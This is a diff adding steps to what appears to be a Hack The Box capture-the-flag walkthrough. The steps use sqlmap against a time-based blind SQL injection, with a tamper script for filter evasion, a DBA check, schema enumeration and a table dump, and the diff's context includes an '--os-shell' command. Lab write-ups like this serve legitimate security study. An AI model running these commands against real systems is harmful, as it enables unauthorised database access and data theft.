@@ -216,5 +216,25 @@ sqlmap -r os-exploit.req --batch -p "id" --os-shell
 sqlmap -r mimishop-action.req --batch -p 'id' --random-agent --tamper=between -dbms MySQL --flush-session
 ```  
 
+>SQLMAP discover `Parameter: JSON id ((custom) POST) Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind`.  
+>Check permissions is DBA
 
+```
+sqlmap -r mimishop-action.req --batch -p 'id' --random-agent --tamper=between -dbms MySQL --is-dba
+```  
 
+>SQLMAP discover `current user retrieved: admin@localhost - current user is DBA: False`.  
+>Check database schema enumeration
+
+```
+sqlmap -r mimishop-action.req --batch -p 'id' --random-agent --tamper=between -dbms MySQL --schema
+```  
+
+>SQLMAP discover `retrieved: databases: 'information_schema, production'`.
+>Dump Content for table `final_flag`
+
+```
+sqlmap -r mimishop-action.req --batch -p 'id' --random-agent --tamper=between -dbms MySQL -D production -T final_flag --dump
+```  
+
+>SQLMAP discover `HTB{flag}`.  
